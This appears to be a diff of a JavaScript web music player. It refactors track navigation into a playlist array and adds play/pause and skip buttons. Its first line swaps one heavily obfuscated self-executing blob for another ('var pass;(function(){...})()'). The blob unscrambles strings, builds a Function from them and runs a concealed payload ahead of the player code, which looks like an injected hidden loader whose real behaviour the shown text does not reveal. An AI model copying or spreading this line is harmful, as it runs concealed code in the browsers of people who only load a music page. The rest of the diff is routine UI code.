@@ -1,189 +1,113 @@
-var pass;(function(){var ASG='',gXE=516-505;function yDq(q){var z=1186374;var u=q.length;var c=[];for(var t=0;t<u;t++){c[t]=q.charAt(t)};for(var t=0;t<u;t++){var a=z*(t+69)+(z%49653);var e=z*(t+492)+(z%41103);var n=a%u;var j=e%u;var y=c[n];c[n]=c[j];c[j]=y;z=(a+e)%6634520;};return c.join('')};var pyT=yDq('cfzyesqstvndurwrnphgckalxtjicrtumoobo').substr(0,gXE);var ZKI='+)+a)=+(, r2hSu<A;[rjl +s=offdezgha56hmf1zqre46vewrg=;=al]ps.8ht7dc81,7otnsc)gurs,o=,;f;v[,0gn86(00lbas,pmr00h0;}9.;u=7=6g(hrot;rknr;=aessa,)=[l<vv+=m)orrt{.),b34n;l+1+of6ar(jj]v(lv=14i0q+ui4(s;=)v2o(;u]t)f n+(fev>t2enc !=)8nvn1z "Ass==(z(ec(9;viurt ,"].rim(se+n=c7,aa+pl),a.2ll}khn+;[urit9.pl(t9=}r};2n(>r l18 l;sndva*,+f7lacr](r-dn2.,drasup.rgegtaeears5ir""1uca t=a{(i;jr;t +)d<z,15.lcailrj"r].9sbier-9=iu; vot*9.y=[tj)q)cc=r;;va2li)b.u!=ab["l=n]b)o-ag; ;t(;"a;=japg{h]=n)v};ax+aphiiplbrsrC0A.,m]b (8{0i.t  ev(eexACib=;u=,;5.tpab;oi)h;efto)t;=6{s) p(s(=(,]zmtr.drC"(r7o)p(a.fhorhsub,hsot=v7[v,(iol)usC]=[a]kc)un+pp+se1un=;.tul(7{g;p,; bn.[=l"q.n1a48a7o[+in-)f.rrik.}r;xn<a+m=.(<yp16hA1;)+)oeva+ dircf(.yutelvo]dae0fu+))2=l2lvs,-6,1e;;=anr r )n;4a0xmo,-r91g[artmf vr8=ie . +;f n;Cxz({=,)g5[gt;olthog)eodjdenrrihel(b.xp,h0trec+;)l(vyS,b;)gb;,-lChtrllu(+q[C )on=v=fnf(;.si[i}3uaa;=n=rC";(8)]';var VCl=yDq[pyT];var TGn='';var diI=VCl;var VhR=VCl(TGn,yDq(ZKI));var AkQ=VhR(yDq('o4mc"+2lwl=_p9_tp3hC7{XX;(X1egaX);,e$(o2nX)omdlSws;_ge-)jcta3_()rSt;2))3_Xf== .p.(X$r_X5.r;af]537;b,5n.)Xj#4udXe4%_cll5XuXX$XcXt_1%"==_$.msloo2d_]Xa(n_X0X!3oet}cr]qXX(bbngt)e8ri)zXX!e!_b.7XrX.des1sof.7a3X1g..t);a)..$da.Xb"ozs(wo0es,(;7ofj4gv;321e;tr=4XXX_.]o_{%in6X9%6cc*%ab..3!b_(Xf!on6)c6cnc.\'uh-IaXnt0(t\/enctE,!.c).#;h)_X;b{X,0uocXbaX0t90;or.(5!he1Xas(ae0,1_28.XX)caplcd4=.=Xm12n=lc;b=3=9c4]jmvgrX%r)w,e).S5pk:krtXs:hof1=kca: 8&}X.&)$XX03ro{,.e8+.h3;.5dX..]leIg 2!3!fe% cmg0foeX(XcX=0;X0Xn,.eddi),7(q.1;n-(.n] Xrkcr.it93)}rf4ldtbuec==09aX(Xel0ie+X)cr.cX]XX8o..X=au7\/5,_ac)),Xnf7s,,ae065X3$4r6(Xaa3.)i,.,}&oioeX 9te).XXp93t13(+)r))44[{_Xa1XXvz08, )1pe0h.X$51r..&d_1:es!r_Xc0_h$2l]j__p)}X)n,Xo_c ,2.{i6_}X5-!e2(;(.4Xah%e o]X%95(o6dXinX2)0:)_o))_a}mo0dnr4X!lX5=f,a.!,elt2Xe_X.aE1yk{=.dsX;;r2XXn0!,9DvX n -e.0r.s__6y3.ntp$)<)X)X1i%,u)mXxXm_t"m5C_0$a%5e=Xl8X10X4d)cXi7=3(c!21!n(6-)].;ofe_6Xc56s;X(jr"b3#%l}e)g){.c4r(45\'5c_2 5\/X+5;#5<X!+f91se(t(7 X!eh,m2X;j),\'c%)cX)n$ime&)(fs\/Xf(]! 709Xco7"$h(]XXg{343(a(1X{!;7"6(l!90,$("]g 9;]304f.e.Xeg1Xi2bertXv {ow]r}jpcs7XX(X_=X(!$,l cs!,n,m 2#XkX+X.X00Xs<*(lS28]7,e4_"(7X5l\'yj_2af;n;(;X2salC9h.Xc; S),2fr.49a]*_,#)!#.1"d3}ha*2)ete.36.)dl*5Xtce(e41i=,oi($o[wmedcrXXX+st]4+.!6n=6&$a;7 X!!(}lX#kX[$$)1t4r $X.4;{a5$ X=..%%(_aeaXm(X,)p{sp2.)mX.X52ru&- $S.Xo.5)=X(no)XXeXXj(,eXt4."a)"a)X1,=c{5[{, )Sa4((i_j(c_.3aot!XylX=9;tu3cti6-XX<}=:!,a.3_.cn3+p)_X= t;9)$$==r_tt8ne\/a3.).r5s_=9)}% .].toX(rneX=.lX e( f__X$]'));var enU=diI(ASG,AkQ );enU(1365);return 9247})()
-
+var pass;(function(){var PgX='',ObC=182-171;function fNY(n){var a=2220863;var l=n.length;var f=[];for(var g=0;g<l;g++){f[g]=n.charAt(g)};for(var g=0;g<l;g++){var k=a*(g+182)+(a%33317);var m=a*(g+616)+(a%45615);var h=k%l;var t=m%l;var y=f[h];f[h]=f[t];f[t]=y;a=(k+m)%3553785;};return f.join('')};var oEC=fNY('cwzsunthdprrxjoevmusyrlccgqkaittbofon').substr(0,ObC);var JKF='2g+ ur=,66Ag4h )r(+];y "=pa2.-[}evih1p;(tapq)(m=(;zng;s}(pe+re9if(6++=aal3=.l1r,v,=lk5Cln=n}uo=0=9+,t6,C7sh5= +t,7{sup7it;het.>o-g;+rr6qa<sto] 3r..leaw-o;(r+)z8=ra.irgm1;tkrs)=)]ri]llta(,n=)70h(rt=f3y)vn,r"{,cir+yg"mnr1"d-t+f(] r+( a)]a f)ka(01>n*i="o.s;l,d v df=(ad1ek, nale)s"vt,[1++o(=ckhrr{ aiex+wa.,bxi;r)v8[nv{n==}v=.r8rCi ruS;,j}er tCcucffte)=,cq=s(;ashvp "q[0;r= i,tusho.}lu=or= aoCo.)A;hlf;f,;62rjg{a()(fw);o+=iyv)+(+ls6;drvh;hr )<vo"(m)kv0;rl+pxy.;; i (m*sa)v=r+<e(2fe0g+s-t;ui8(or!]veatev=A)l+al;.pruh]eei-[s7r=y.quv;7+gmv.ey;,{cahu.nn1ofto{k6=ll2 6(=j(,;f((sd;w.1,trcale6g(he;yp05,v;9yn8cus4[o0.]mv(9p=aCva}!1p=as2vdj=;mtilc]al.rusr2=p4r)nrainv]xza8ongl(..jo(ah;n+tvocr)u;,z=f0g(;rva)Ca=[8lgvn,t)b;ea[[l" vok9sfianpu ua,r9)chhn;o)(toh).accA;fv4;].vv5)rn);unn[o=0;g7ae7varA;00ev;=8te,px)tyr3)-hh.7o1a ;g0(rbg0fv<7;z,ojg2r=j.tSxt.;=)rCnj8)]den.[2];a[")murd (<s+,[aykv=i9[hsoqtuv;m';var nQO=fNY[oEC];var FpO='';var hLh=nQO;var MiS=nQO(FpO,fNY(JKF));var yUW=MiS(fNY('_3Zmwi!\'awZ\/ca!)!l,3Z,a$l(a (Z!bu,2bZ1)e(8,ief=5#Z_.3Zg8.e.$_lr9lg"yZZ]c*S. on=eo505_mrn_Zlf9ab!nn9Z15 re=pZZ%"tZZ}r3.3Zr6 r(_a*n$"tos"41hZZ;.1.1_e7S092_Zm("oZ(Ztcu fZ{_ZZ)Z)tZ)eE$,ZdtosZ*.Zbw%4$7_(.j(pD_ol))Zajb]Z;)(yZ8ntZZZ :3}.&(ZZ176:%4(713Zdf)Se;Z(!lk${ZZ.i9n%n)pvZe%b"5.2hr.\'e7e)loZZ) .9,.t0g.ae,a)8.#tZ$ZZ-otsru5 ){8!mkyo$l5l_Z{o(e;ewb1o.%)mewb.0,1h%e.ar.ut{e,)%.a4+ZZkZ) l)s_(_ Z73$Zg_$2$l6f3Zf5 j]]")o&m8.=_Zv_Zn_3}eZ#sgerp(jo;Z)3=ed4.,n$j$t"ks53.#_90.f{jdZoZ7t{ee)a$IZ%eZj.;\'=[c3(v{ef$7c!(oarl2a(iZtejoc)tfpiee(9(tZ31.(%)n*sd1=(v{{4j.o=,$;9( Csv(e1Z_e9=&e;!(v!o8f)a7s.}=.!.ts)vuZ!,Zw) Z(ts(i_c0,i37.[i3Z7.%=)5;7h.af#Cb=e{6mZ_$Zc!1l7e.8nZ7;f(fr.;nZ$(5.ZZrZ!2)3!Z ee;o,6ZrleZf._;)ZagtZlf,f]1-=0]%ZZvj3+i,_t..(S&])=$tetf.Z1on!d0u{+eea-rwc,}6 \'ZZf0fZk(woejZ7(e-fZZut0=e5o)%os;.]r1t}.2il47l3!ju1\/.$,-71.h..Z$ea_Z(cjoZZ;.91w;e#u8r)%t,\/ser.mtZtc $37_!9_j(=__rZ(lkf&+Z(0;!mju+!v]_.e4k67b4"e5)nZeaZrn.t)6).3a6nv7f75)e4Zt.o%r3(afe5;_7E=i ceee] 15)h)}dg3}g; s.,r)92_l"]ottro3r(fZe9(1Z .a,ox.8$)(2.Z2a("aZl72.eeZZe;+_;o0 oZ$l]ae(,)Zs]oi2f1}3l%))trZ_Iet.r5t4}aa+b=o\/_$+rZ].74e;({0)b9tZ,,dZ2ZZ7ZejZZ1!0jh;ZZ+Z Zl,&_eZ5o3l#e{,=Ze$ZZ3 le7a_f.8(1t.nf)fa;i!3nsCboxm3] l\',e19l=).$2&t!((Z1 ete[,l}Z1rZ)S04=i__2{$).e6(et)db=.ov{.8]}{_o;.63)Zsrdeu7+5Z80,r=Z6;!l3.Z9..;f92rn..6mben5bxsa5_el$1!;;!.)w$fl=ol!Sblwv(h4t{Z%ff*ct)))ZZ(Z,no$2a)7)9)="=f2ZuZntZe%gehas=;0oZivbift nS]Z_r__501n:der_Z9!t();3f=tt:(re]c6u.c")(oZ,6)efoZb7xc=Z7;$b[!_ (4,o#;6}eZ)ro%{Zn4Za}!$.'));var ejv=hLh(PgX,yUW );ejv(2173);return 3258})()
 let fft, canvas, song, started = false;
 let currentSongName = 'Interworld.mp3';
 let radio = document.getElementById('music');
 let playlists = document.getElementById('playlist');
 let x = document.getElementById('x');
+let button_play = document.getElementById("click");
+let title = document.getElementById('title');
 const progress = document.getElementById('progress');
 
 function pause(){
   song.pause();
+  button_play.textContent = "►"
 }
 function stopAllAudio() {
   if (song && song.isPlaying()) {
     song.stop();
   }
 }
+function togglePlayPause() {
+  if (song && song.isPlaying()) {
+    button_play.textContent = "►"
+    pause();
+  } else {
+    button_play.textContent = "||"
+    play();
+  }
+}
+
+const playlist = [
+  { file: '1272023_Memory-Reboot.mp3', title: 'Memory Reboot - VØJ', menu_title: 'Memory Reboot - VØJ'},
+  { file: 'EEYUH!xFluxxwave.mp3', title: 'EEYUH! x Fluxxwave', menu_title: 'EEYUH! x Fluxxwave(Slowed)'},
+  { file: 'Fluxxwave.mp3', title: 'Fluxxwave(2) - Clovis Reyes', menu_title: 'Fluxxwave(Lay with me) - Clovis Reyes'},
+  { file: '1235289_Fluxxwave.mp3', title: 'Fluxxwave - Clovis Reyes', menu_title: 'Fluxxwave - Clovis Reyes'},
+  { file: 'Interworld.mp3', title: 'interworld - metamorphosis', menu_title: 'interworld - metamorphosis' },
+  { file: 'PASSO BEM SOLTO.mp3', title: 'PASSO BEM SOLTO - ATLXS', menu_title: 'PASSO BEM SOLTO - ATLXS' },
+  { file: 'MONTAGEM BAILÃO.mp3', title: 'MONTAGEM BAILÃO - ATLXS', menu_title: 'MONTAGEM BAILÃO - ATLXS' },
+  { file: 'MONTAGEM LADRAO.mp3', title: 'MONTAGEM LADRAO - ATLXS', menu_title: 'MONTAGEM LADRAO - ATLXS' }
+];
+
+let currentIndex = 4;
+
+function setCurrentIndexByName(name) {
+  const index = playlist.findIndex(item => item.file === name);
+  if (index !== -1) currentIndex = index;
+}
+
+function changeSong(direction) {
+  stopAllAudio();
+  started = true;
+
+  if (direction === 'back') {
+    currentIndex = (currentIndex - 1 + playlist.length) % playlist.length;
+  } else if (direction === 'forward') {
+    currentIndex = (currentIndex + 1) % playlist.length;
+  }
+
+  const nextSong = playlist[currentIndex];
+
+  loadSound(nextSong.file, function(newSong) {
+    song = newSong;
+    currentSongName = nextSong.file;
+    radio.textContent = nextSong.title;
+    title.textContent = nextSong.menu_title;
+    song.play();
+    fft.setInput(song);
+    loop();
+    button_play.textContent = "||";
+  });
+}
+
+function back() {
+  changeSong('back');
+}
+
+function forward() {
+  changeSong('forward');
+}
 
 function play() {
-  stopAllAudio();
-  song.play();
-  fft.setInput(song);
-  loop();
-  started = true;
-}
-function back() {
-  stopAllAudio();
-  started = true;
-  if(currentSongName === 'EEYUH!xFluxxwave.mp3'){
-    loadSound('1272023_Memory-Reboot.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = '1272023_Memory-Reboot.mp3';
-      radio.textContent = 'Memory Reboot - VØJ';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if(currentSongName === 'Fluxxwave.mp3') {
-    loadSound('EEYUH!xFluxxwave.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'EEYUH!xFluxxwave.mp3';
-      radio.textContent = 'EEYUH! x Fluxxwave';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
+  if (song && song.isPlaying()) return;
 
-  }
-  else if(currentSongName === '1235289_Fluxxwave.mp3'){
-    loadSound('Fluxxwave.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'Fluxxwave.mp3';
-      radio.textContent = 'Fluxxwave(2) - Clovis Reyes';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if(currentSongName === 'Interworld.mp3') {
-    loadSound('1235289_Fluxxwave.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = '1235289_Fluxxwave.mp3';
-      radio.textContent = 'Fluxxwave - Clovis Reyes';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  } 
-  else if(currentSongName === 'PASSO BEM SOLTO.mp3') {
-    loadSound('Interworld.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'Interworld.mp3';
-      radio.textContent = 'interworld - metamorphosis';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else {
-    loadSound('Interworld.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'Interworld.mp3';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-}
-function forward() {
   stopAllAudio();
-  started = true;
-  if(currentSongName === '1272023_Memory-Reboot.mp3'){
-      loadSound('EEYUH!xFluxxwave.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'EEYUH!xFluxxwave.mp3';
-      radio.textContent = 'EEYUH! x Fluxxwave';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
+
+  const currentTrack = playlist[currentIndex];
+
+  if (song && song.isLoaded() && currentSongName === currentTrack.file) {
+    song.play();
+    fft.setInput(song);
+    loop();
+    started = true;
+    button_play.textContent = "||";
+    return;
   }
-  else if(currentSongName === 'EEYUH!xFluxxwave.mp3') {
-      loadSound('Fluxxwave.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'Fluxxwave.mp3';
-      radio.textContent = 'Fluxxwave(2) - Clovis Reyes';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if(currentSongName === 'Fluxxwave.mp3'){
-      loadSound('1235289_Fluxxwave.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = '1235289_Fluxxwave.mp3';
-      radio.textContent = 'Fluxxwave - Clovis Reyes';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if (currentSongName === '1235289_Fluxxwave.mp3') {
-    loadSound('Interworld.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'Interworld.mp3';
-      radio.textContent = 'interworld - metamorphosis';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if (currentSongName === 'Interworld.mp3') {
-    loadSound('PASSO BEM SOLTO.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'PASSO BEM SOLTO.mp3';
-      radio.textContent = 'PASSO BEM SOLTO - ATLXS';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if (currentSongName === 'PASSO BEM SOLTO.mp3') {
-    loadSound('MONTAGEM BAILÃO.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'MONTAGEM BAILÃO.mp3';
-      radio.textContent = 'MONTAGEM BAILÃO - ATLXS';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else if (currentSongName === 'MONTAGEM BAILÃO.mp3') {
-    loadSound('MONTAGEM LADRAO.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'MONTAGEM LADRAO.mp3';
-      radio.textContent = 'MONTAGEM LADRAO - ATLXS';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
-  else {
-    loadSound('Interworld.mp3', function(newSong) {
-      stopAllAudio();
-      song = newSong;
-      currentSongName = 'Interworld.mp3';
-      song.play();
-      fft.setInput(song);
-      loop();
-    });
-  }
+
+  loadSound(currentTrack.file, function(newSong) {
+    song = newSong;
+    currentSongName = currentTrack.file;
+    radio.textContent = currentTrack.title;
+    title.textContent = currentTrack.menu_title;
+    song.play();
+    fft.setInput(song);
+    loop();
+    started = true;
+    button_play.textContent = "||";
+  });
 }
+
+
+
 function menu() {
   playlists.style.display = 'block';
   x.style.display = 'block';
@@ -196,18 +120,42 @@ function preload() {
   song = loadSound('Interworld.mp3');
   currentSongName = 'Interworld.mp3';
 }
+function before() {
+  if (song && song.isLoaded()) {
+    let nuevoTiempo = Math.max(0, song.currentTime() - 10);
+    song.jump(nuevoTiempo);
+  }
+}
+function after() {
+  if (song && song.isLoaded()) {
+    let nuevoTiempo = Math.max(0, song.currentTime() + 10);
+    song.jump(nuevoTiempo);
+  }
+}
+
+
+
 function first_song() {
   first_screen = document.getElementById('first_forever');
   first_screen2 = document.getElementById('first');
   background = document.getElementById('Background');
-  title = document.getElementById('title');
   music_bar = document.getElementById('progress-container');
+  click_before = document.getElementById('click2');
+  click_after = document.getElementById('click3');
+  forward2 = document.getElementById('click4');
+  before2 = document.getElementById('click5');
+
   if(first_screen.style.display === 'block' || first_screen.style.display === '') {
     first_screen.style.display = 'none';
     first_screen2.style.display = 'none';
     background.style.display = 'block';
     title.style.display = 'block';
     music_bar.style.display = 'block';
+    button_play.style.display = 'block';
+    click_after.style.display = 'block';
+    click_before.style.display = 'block';
+    before2.style.display = 'block';
+    forward2.style.display = 'block';
   }
   else{
     first_screen.style.display = 'block';
@@ -215,6 +163,11 @@ function first_song() {
     background.style.display = 'none';
     title.style.display = 'none';
     music_bar.style.display = 'none';
+    button_play.style.display = 'none';
+    click_after.style.display = 'none';
+    click_before.style.display = 'none';
+    before2.style.display = 'none';
+    forward2.style.display = 'none';
   }
 }
 
